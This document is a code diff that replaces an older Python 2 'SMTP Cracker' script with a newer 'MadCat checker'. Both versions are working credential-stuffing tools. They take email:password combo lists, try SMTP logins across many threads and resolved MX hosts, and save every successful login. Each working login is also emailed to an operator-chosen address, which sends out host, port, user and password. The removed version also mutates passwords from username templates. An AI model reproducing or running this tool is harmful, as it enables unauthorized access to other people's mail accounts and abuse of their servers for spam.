@@ -1,446 +1,203 @@
-import socket,threading,base64,datetime,sys,ssl,imaplib,time,re,os,sys,random,signal
-try:
-	import Queue
-except:
-	try:
-	 import queue as Queue
-	except:
-		pip.main['install','Queue']
-
-to_check={}
+import socket,threading,base64,datetime,sys,ssl,smtplib,time,re,os,sys,random,signal,queue
+from dns import resolver
 from colorama import *
-init()
-print '\033[1m'
-class IMAP4_SSL(imaplib.IMAP4_SSL):
-    def __init__(self, host='', port=imaplib.IMAP4_SSL_PORT, keyfile=None, 
-                 certfile=None, ssl_version=None, ca_certs=None, 
-                 ssl_ciphers=None,timeout=40):
-       self.ssl_version = ssl_version
-       self.ca_certs = ca_certs
-       self.ssl_ciphers = ssl_ciphers
-       self.timeout=timeout
-       imaplib.IMAP4_SSL.__init__(self, host, port, keyfile, certfile)
-  
-    def open(self, host='', port=imaplib.IMAP4_SSL_PORT):
-       self.host = host
-       self.port = port
-       self.sock = socket.create_connection((host, port),self.timeout)
-       extra_args = {}
-       if self.ssl_version:
-           extra_args['ssl_version'] = self.ssl_version
-       if self.ca_certs:
-           extra_args['cert_reqs'] = ssl.CERT_REQUIRED
-           extra_args['ca_certs'] = self.ca_certs
-       if self.ssl_ciphers:
-           extra_args['ciphers'] = self.ssl_ciphers
-  
-       self.sslobj = ssl.wrap_socket(self.sock, self.keyfile, self.certfile, 
-                                     **extra_args)
-       self.file = self.sslobj.makefile('rb')
-class checkerr(threading.Thread):
-	def __init__(self,host,user,pwd,timeout,interval):
-		t=threading.Thread.__init__(self)
-		self.host=host
-		self.user=user
-		self.pwd=pwd
-		self.interval=interval
-		self.timeout=timeout
-		self.connected=False
-		self.i=None
-		self.work=True
-		self.attemp=4
-		self.inbox=''
-		self.spam=''
-	def connect(self):
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.application import MIMEApplication
+
+# ~~~~ SMTP checker script ~~~~~~~~~~~~~~~~~~
+# ~~~~ MadCat checker v1.0 ~~~~~~~~~~~~~~~~~~
+# ~~~~ https://github.com/aels/mailtools ~~~~
+# ~~~~ contact: https://t.me/freebug ~~~~~~~~
+
+if sys.version_info[0] < 3:
+	raise Exception("Python 3 or a more recent version is required.")
+try:
+	from alive_progress import alive_bar
+except ImportError:
+	from pip._internal import main as pip
+	pip(['install', '--user', 'alive_progress'])
+	from alive_progresss import alive_bar
+
+class c:
+	HEAD = "\033[95m"
+	BLUE = "\033[94m"
+	CYAN = "\033[96m"
+	GREEN = "\033[92m"
+	WARN = "\033[93m"
+	FAIL = "\033[91m"
+	END = "\033[0m"
+	BOLD = "\033[1m"
+	UNDERLINE = "\033[4m"
+
+def get_mx_server(domain):
+	global mx_cache
+	if not domain in mx_cache:
 		try:
-			i=IMAP4_SSL(host=self.host,port=993)
-			
-			i.login(self.user,self.pwd)
-			self.i=i
-			self.connected=True
-		except Exception,e:
-			print str(e)
-			i.close()
-			self.connected=False
-	def find(self):
-		global to_check
-		if self.inbox=='':
-			rez,folders=self.i.list()
-			for f in folders:
-				if '"|" ' in f:
-					a=f.split('"|" ')
-				elif '"/" ' in f:
-					a=f.split('"/" ')
-				folder=a[1].replace('"','')
-				if self.inbox=="":
-					if 'inbox' in folder.lower():
-						self.inbox=folder
-				elif self.spam=="":
-					if 'spam' in folder.lower():
-						self.spam=folder
-			if self.spam=='':
-				for f in folders:
-					if '"|" ' in f:
-						a=f.split('"|" ')
-					elif '"/" ' in f:
-						a=f.split('"/" ')
-					folder=a[1].replace('"','')
-					if self.spam=="":
-						if 'trash' in folder:
-							self.spam=folder
-					else:
-						break
-		print '\033[92m [+] Checking for emails\033[00m'
-		self.i.select(self.inbox)
-		found=[]
-		for k,t in enumerate(to_check):
-			rez=self.i.search(None,'SUBJECT',t[0])
-			times=time.time()-t[1]
-			if times-2>self.timeout:
-				
-				open('smtp_checked.txt','a').write(t[0]+"| NOTFOUND | %.2f sec\n"%times)
-				found.append(k)
-				
-			if len(rez)>0:
-				open('smtp_checked.txt','a').write(t[0]+"| INBOX | %.2f sec\n"%times)
-				found.append(k)
-		self.i.select(self.spam)
-		for k,t in enumerate(to_check):
-			rez=self.i.search(None,'SUBJECT',t[0])
-			times=time.time()-t[1]
-			if times-2>self.timeout:
-				
-				open('smtp_checked.txt','a').write(t[0]+"| NOTFOUND | %.2f sec\n"%times)
-				found.append(k)
-			if len(rez)>0:
-				open('smtp_checked.txt','a').write(t[0]+"| SPAM | %.2f sec\n"%times)
-				found.append(k)
-		new=[]
-		for k,v in enumerate(to_check):
-			if k not in found:
-				new.append(v)
-		to_check=new
-		print to_check
-
-	def run(self):
-		global to_checks
-		while self.work:
-			if not self.connected:
-				if self.attemp<=0:
-					return 0
-				self.connect()
-				self.attemp-=1
-			if len(to_check)>0:
-				self.find()
-			time.sleep(self.interval)
-
-def tld2(dom):
-		global tlds
-		if "." not in dom:
-			return ""
-		dom=dom.lower()
-		parts=dom.split(".")
-		if len(parts)<2 or parts[0]=="" or parts[1]=="":
-			return ""
-		tmp=parts[-1]
-
-		for i,j in enumerate(parts[::-1][1:5]):
-		
-			try:
-				tmp=tlds[tmp]
-				tmp=j+"."+tmp
-			except:
-				if i==0:
-					return ""
-				return tmp
-		return tmp		
-def logo():
-    clear = "\x1b[0m"
-    colors = [36, 32, 34, 35, 31, 37]
-
-    x = """ 
- 
-
-
-   _____           _          _____ _               _             
-  / ____|         | |        / ____| |             | |            
- | (___  _ __ ___ | |_ _ __ | |    | |__   ___  ___| | _____ _ __ 
-  \___ \| '_ ` _ \| __| '_ \| |    | '_ \ / _ \/ __| |/ / _ \ '__|
-  ____) | | | | | | |_| |_) | |____| | | |  __/ (__|   <  __/ |   
- |_____/|_| |_| |_|\__| .__/ \_____|_| |_|\___|\___|_|\_\___|_|   
-                      | |                                         
-                      |_|                                         
-                                                      
-                                                             
- Smtp Checker V1.1 | Coded by Rootinabox, fixed by Aels
-                      
- [+] Telegram : @rootinabox
- [+] Channel  : https://t.me/Rootinabox_Channel
-
-+-------- there is no nobility in poverty! --------+
-
-			                  """
-    for N, line in enumerate( x.split( "\n" ) ):
-        sys.stdout.write( " \x1b[1;%dm%s%s\n " % (random.choice( colors ), line, clear) )
-        time.sleep( 0.05 )
-
-
-logo()
-class consumer(threading.Thread):
-	def __init__(self,qu):
-		threading.Thread.__init__(self)
-		self.q=qu
-		self.hosts=["","smtp.","mail.","webmail.","mx."]
-		self.ports=[587,465,25,2525]
-
-		self.timeout=2
-
-	def sendCmd(self,sock,cmd):
-		sock.send(cmd+"\r\n")
-		return sock.recv(900000)
-	def addBad(self,ip):
-		global bads,rbads
-		if rbads:
-			open('smtp_bads.txt','a').write(ip+'\n')
-			bads.append(ip)
-		return -1
-	def findHost(self,host):
-		global cache,bads,rbads
-		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-		s.setblocking(0)
-		s.settimeout(self.timeout)
-
-		try:
-			d=cache[host]
-			try:
-				if self.ports[d[1]]==465:
-					s=ssl.wrap_socket(s)
-				s.connect((self.hosts[d[0]]+host,self.ports[d[1]]))
-				return s
-			except Exception,e:
-				if rbads:
-					bads.append(host)
-					open('smtp_bads.txt','a').write(host+'\n')
-				return None
-		except KeyError:
-			pass
-		print '[*] Searching smtp host and port on '+host
-		cache[host]=[-1,-1]
-		for i,p in enumerate(self.ports):
-			for j,h in enumerate(self.hosts):
-				
-				try:
-					print '[*] Trying connection on '+h+host+':'+str(p)
-
-					s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-					s.setblocking(0)
-					s.settimeout(self.timeout)
+			for data in resolver.query(domain, 'MX'):
+				mx_host = data.exchange.to_text()[0:-1]
+				break
+			s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+			s.setblocking(0)
+			s.settimeout(1)
+			for h in [mx_host,domain,'smtp.'+domain,'mail.'+domain,'webmail.'+domain,'mx.'+domain]:
+				for p in [587,25,465]:
 					if p==465:
-						s=ssl.wrap_socket(s)
-					s.connect((h+host,p))
-					cache[host]=[j,i]
-					return s
-				except Exception,e:					
-					continue
-		bads.append(host)
-		del cache[host]
-		open('smtp_bads.txt','a').write(host+'\n')
-		return None
-
-	def getPass(self,passw,user,domain):
-		passw=str(passw)
-		
-		if '%null%' in passw:
-			return ""
-		elif '%user%' in passw:
-			user=user.replace('-','').replace('.','').replace('_','')
-			return passw.replace('%user%',user)
-		elif '%User%' in user:
-			user=user.replace('-','').replace('.','').replace('_','')
-			return passw.replace('%User%',user)
-		elif '%special%' in user:
-			user=user.replace('-','').replace('.','').replace('_','').replace('e','3').replace('i','1').replace('a','@')
-			return passw.replace('%special%',user)
-		elif '%domain%' in passw:
-			return passw.replace('%domain%',domain.replace("-",""))
-		if '%part' in passw:
-			if '-' in user:
-				parts=user.split('-')
-			elif '.' in user:
-				parts=user.split('.')
-			elif '_' in user:
-				parts=user.split('_')				
-			try:
-				h=passw.replace('%part','').split('%')[0]
-				i=int(h)
-
-				p=passw.replace('%part'+str(i)+'%',parts[i-1])
-				return p
-			except Exception,e:
-				return None
-		return passw
-
-	def connect(self,tupple,ssl=False):
-		global bads,cracked,cache,email
-		
-		host=tupple[0].rstrip()
-		host1=host
-		user=tupple[1].rstrip()
-		task_id = tupple[3]
-		
-		if host1 in cracked or host1 in bads:
-			return 0
-		passw=self.getPass(tupple[2].rstrip(),user.rstrip().split('@')[0],host.rstrip().split('.')[0])
-		if passw==None:
-			return 0
-		try:
-			if cache[host][0]==-1:
-				return 0
-		except KeyError:
+						s = ssl.wrap_socket(s)
+					try:
+						s.connect((h, p))
+						s.close()
+						mx_cache[domain] = (h, p)
+						return mx_cache[domain]
+					except:
+						pass
+		except:
 			pass
-		s=self.findHost(host)
-		if s==None:
-			return -1
-		port=str(self.ports[cache[host][1]])
-		host=self.hosts[cache[host][0]]+host
-		print '\033[93m['+str(task_id)+'] Trying \033[00m'+host+':'+port
-		try:
-			banner=s.recv(1024)
-			if banner[0:3]!="220":
-				self.sendCmd(s,'QUIT')
-				s.close()
-				return self.addBad(host1)
-			rez=self.sendCmd(s,"EHLO ADMIN")
-			rez=self.sendCmd(s,"AUTH LOGIN")
-			if rez[0:3]!='334':
-				self.sendCmd(s,'QUIT')
-				s.close()
-				return self.addBad(host1)
-			rez=self.sendCmd(s,base64.b64encode(user))
-			if rez[0:3]!='334':
-				self.sendCmd(s,'QUIT')
-				s.close()
-				return self.addBad(host1)
-			rez=self.sendCmd(s,base64.b64encode(passw))
-			if rez[0:3]!="235" or 'fail' in rez:
-				self.sendCmd(s,'QUIT')
-				s.close()
-				return 0
-			print '\033[92m[>] Sending \033[00m'+host+'|'+port+'|'+user+'|'+passw
-			open('smtp_cracked.txt','a').write(host+"|"+port+"|"+user+"|"+passw+"\n") #Some Peaple Need This Format
-			cracked.append(host1)
-			rez=self.sendCmd(s,"RSET")
-			if rez[0:3]!='250':
-				self.sendCmd(s,'QUIT')
-				s.close()
-				return self.addBad(host1)
-			rez=self.sendCmd(s,"MAIL FROM: <"+user+">")
-			if rez[0:3]!='250':
-				self.sendCmd(s,'QUIT')
-				s.close()
-				return self.addBad(host1)
-			rez=self.sendCmd(s,"RCPT TO: <"+email+">")
-			if rez[0:3]!='250':
-				self.sendCmd(s,'QUIT')
-				s.close()
-				return self.addBad(host1)
-			rez=self.sendCmd(s,'DATA')
-			headers ='From: <'+user+'> \r\n'
-			headers+='To: '+email+'\r\n'
-			headers+='Reply-To: '+email+'\r\n'
-			headers+='Subject: %s:%s %s %s'%(host,port,user,passw)+'\r\n'
-			headers+='MIME-Version: 1.0\r\n'
-			headers+='Content-Transfer-encoding: 8bit\r\n'
-			headers+='Return-Path: %s\r\n'%user
-			headers+='X-Priority: 1\r\n'
-			headers+='X-MSmail-Priority: High\r\n'
-			headers+='X-Mailer: Microsoft Office Outlook, Build 11.0.5510\r\n'
-			headers+='X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441\r\n'
-			headers+='%s|%s|%s|%s'%(host,port,user,passw)+'\r\n.\r\n'
-			s.send(headers)
-			rez=s.recv(1000)
-			self.sendCmd(s,'QUIT')
-			s.close()
-		except Exception,e:
-			open('smtp_bads.txt','a').write(host+":"+port+":"+str(e)+"\n")
-			s.close()
-			return self.addBad(host1)
-
-	def run(self):
-		while True:
-			cmb=self.q.get()
-			self.connect(cmb)
-			self.q.task_done()
+		mx_cache[domain] = False
+	return mx_cache[domain]
 
 def quit(signum, frame):
-	print "\033[93mExiting...\033[00m\n"
+	print('\n\033[93mExiting...\033[00m\n')
 	sys.exit(0)
 
-signal.signal(signal.SIGINT, quit)
+def is_valid_email(email):
+	return re.match(r'^[a-z0-9._+-]+@[a-z0-9.-]+\.[a-z]{2,}$', email.lower())
 
-quee=Queue.Queue(maxsize=0)
-tld=['']
-tlds=cache={}
-bads=[]
-cracked=[]
-rbads=0
-try:
- inputs=open(sys.argv[1],'r').read().splitlines()
- email=sys.argv[2]
- thret=sys.argv[3]
- if int(thret)>200:
-	thret=200
-except:
- try:
- 	inputs=open(raw_input('\033[94m[\033[92mPath to smtp list: \033[94m]\033[00m '),'r').read().splitlines()
- except:
- 	exit("Accepted format is 'smtp_list.txt' containing host|port|username|password")
- try:
- 	email = raw_input(' \033[94m[\033[92mEmail address to verify: \033[94m]\033[00m ')
- except:
- 	email = 'foxtestbox@outlook.com'
- 	print 'using default email: foxtestbox@outlook.com'
- try:
-  thret=raw_input('\033[94m [\033[92mThreads (Max:200): \033[94m] \033[00m')
- except:
- 	exit("Error !! ")
- if int(thret)>200:
-	thret=200
- print """ \033[1m\033[93m[\033[91m!\033[93m] SMTP Cracker \n Recoder Email : """+email+"""\n
- \033[94m[\033[91m!\033[94m] \033[93mIf you face any problems or have questions contact me
- \033[94m[\033[92m/\033[94m] \033[93mTelegram > @rootinabox"""
+def find_email_password_indexes(lines):
+	email_index = False
+	password_index = False
+	for line in lines:
+		line = re.sub('[;,\t| ]', ':', line.lower())
+		email = re.search(r'[a-z0-9._+-]+@[a-z0-9.-]+\.[a-z]{2,}', line)
+		if email_index is False and email:
+			email_index = line.split(email.group(0))[0].count(':') or 0
+		if password_index is False and re.search(r'@.+12345', line):
+			password_index = line.split('12345')[0].count(':')
+		if email_index is not False and password_index is not False:
+			return (email_index, password_index)
+	exit('can\'t find email or password field in sample line:\n'+line)
+	
 
+def print_statuses(thread_name, thread_status):
+	global threads_statuses, threads_count, threads_counter, goods
+	sys.stdout.write('\033[F'*threads_count+'\033[F')
+	threads_statuses[thread_name] = thread_status
+	print((
+		f'[ cpu load: {c.BOLD}{round(os.getloadavg()[0]/os.cpu_count(),2)}{c.END} ]'+
+		f'[ threads: {c.BOLD}{threads_counter}{c.END} ]'+
+		f'[ goods: {c.BOLD}{c.GREEN}{goods}{c.END} ]'
+	).rjust(144))
+	for i in range(threads_count):
+		print(threads_statuses['thread'+str(i)] or '')
 
-def part():
-	global tld,tlds
-	for i in tld:
-		tlds[i]=i
-
-init()
-print '\033[1m'
-for i in "loading...":
-        sys.stdout.write(i)
-        sys.stdout.flush()
-        time.sleep(0.2)
-print "\033[00m"
-for i in range(int(thret)):
+def smtp_connect(smtp_server, port, user, password):
 	try:
-		t=consumer(quee)
-		t.setDaemon(True)
-		t.start()
+		if port == 587:
+			tls_context = ssl.create_default_context()
+			tls_context.check_hostname = False
+			tls_context.verify_mode = ssl.CERT_NONE
+			server_obj = smtplib.SMTP(smtp_server, port, timeout=1)
+			server_obj.ehlo()
+			server_obj.starttls(context=tls_context) 
+		elif port == 465:
+			server_obj = smtplib.SMTP_SSL(smtp_server, port, timeout=1)
+		else:
+			server_obj = smtplib.SMTP(smtp_server, port, timeout=1)
 	except:
-		print "\033[91m{!} Working only with %s threads\033[00m"%i
-		break
+		server_obj = smtplib.SMTP(smtp_server, port, timeout=1)
+	server_obj.ehlo()
+	server_obj.login(user, password)
+	return server_obj
 
-	j = 0
-	for i in inputs:
-		if re.match('[\w\.=-]+@[\w\.-]+\.[\w]{2,3}:[a-zA-Z]\w{3,14}',i):
-			user = i.split(':')[0]
-			password = i.split(':')[1]
-			user = user.lower()
-			quee.put((user.split('@')[1], user, password, j))
-		if i.count('|')==3:
-			ii=i.split('|')
-			quee.put((ii[0], ii[2], ii[3], j))
-		j += 1
-quee.join()
+def smtp_sendmail(server_obj, smtp_server, port, smtp_user, password):
+	global verify_email
+	message = MIMEMultipart()
+	message['From'] = f'MadCat checker <{smtp_user}>'
+	message['To'] = verify_email
+	message['Subject'] = 'new SMTP from MadCat checker'
+	message.attach(MIMEText(f'{smtp_server}|{port}|{smtp_user}|{password}', 'html', 'utf-8'))
+	headers = 'Return-Path: '+mail_from+'\n'
+	headers+= 'Reply-To: '+mail_from+'\n'
+	headers+= 'X-Priority: 1\n'
+	headers+= 'X-MSmail-Priority: High\n'
+	headers+= 'X-Mailer: Microsoft Office Outlook, Build 10.0.5610\n'
+	headers+= 'X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441\n'
+	message_raw = headers + message.as_string()
+	server_obj.sendmail(smtp_user, verify_email, message_raw)
+
+def worker_item(quee, results):
+	global threads_counter, verify_email, goods
+	self = threading.current_thread()
+	while True:
+		if quee.empty():
+			break
+		else:
+			smtp_server, port, smtp_user, password = quee.get()
+			results.put((self.name,f'{c.WARN}{c.BOLD}trying mx for{c.END} {smtp_user}:{password}'))
+			if not smtp_server or not port:
+				try:
+					smtp_server, port = get_mx_server(smtp_user.split('@')[1])
+				except:
+					continue
+			results.put((self.name,f'{c.BOLD}connecting to{c.END} {smtp_server}|{port}|{smtp_user}|{password}'))
+			try:
+				server_obj = smtp_connect(smtp_server, port, smtp_user, password)
+				try:
+					smtp_sendmail(server_obj, smtp_server, port, smtp_user, password)
+					worker_results.put((self.name,f'{c.GREEN}{c.BOLD}{smtp_user}:{password}{c.END} sent to {verify_email}'))
+					open(smtp_filename, 'a').write(f"{smtp_server}|{port}|{smtp_user}|{password}\n")
+					goods += 1
+				except:
+					pass
+				server_obj.quit()
+			except Exception as e:
+				e = str(e).strip()
+				results.put((self.name,f'connection error: {c.FAIL}{c.BOLD}{e}{c.END}'))
+	threads_counter -= 1
+
+signal.signal(signal.SIGINT, quit)
+quee = queue.Queue()
+results = queue.Queue()
+goods = 0
+threads_counter = 0
+threads_count = 30
+threads_statuses = {}
+mx_cache = {}
+try:
+	lines = open(sys.argv[1],'r').read().splitlines()
+	smtp_filename = sys.argv[1].split('.')
+	smtp_filename[-2] = smtp_filename[-2]+'_smtp'
+	smtp_filename = '.'.join(smtp_filename)
+	verify_email = sys.argv[2]
+	if not is_valid_email(verify_email):
+		raise
+except:
+	exit(f'usage: \npython3 {sys.argv[0]} list.txt verify_email@example.com')
+email_index, password_index = find_email_password_indexes(lines)
+for line in lines:
+	if line.count('|')==3:
+		quee.put((line.split('|')))
+	else:
+		line = re.sub('[;,\t| ]', ':', line)
+		fields = line.split(':')
+		if fields[email_index] and len(fields[password_index])>7 and not re.search(r'@(gmail\.com|mail\.ru)', fields[email_index]):
+			quee.put((False,False,fields[email_index],fields[password_index]))
+print(f'email_index: {c.BOLD}{str(email_index)}{c.END}')
+print(f'password_index: {c.BOLD}{str(password_index)}{c.END}')
+print(f'verification email: {c.BOLD}{verify_email}{c.END}')
+total = quee.qsize()
+sys.stdout.write('\n'*threads_count)
+for i in range(threads_count):
+	threading.Thread(name='thread'+str(i),target=worker_item,args=(quee,results),daemon=True).start()
+	threads_counter += 1
+	threads_statuses['thread'+str(i)] = 'no data'
+with alive_bar(total,bar='blocks',title='Progress:') as progress_bar:
+	while True:
+		if not results.empty():
+			thread_name, thread_status = results.get()
+			if 'trying' in thread_status:
+				progress_bar()
+			print_statuses(thread_name, '\b'*10+thread_status)
+		if threads_counter == 0 and quee.empty():
+			print('\b'*10+f'{c.GREEN}All done.{c.END}')
+			break
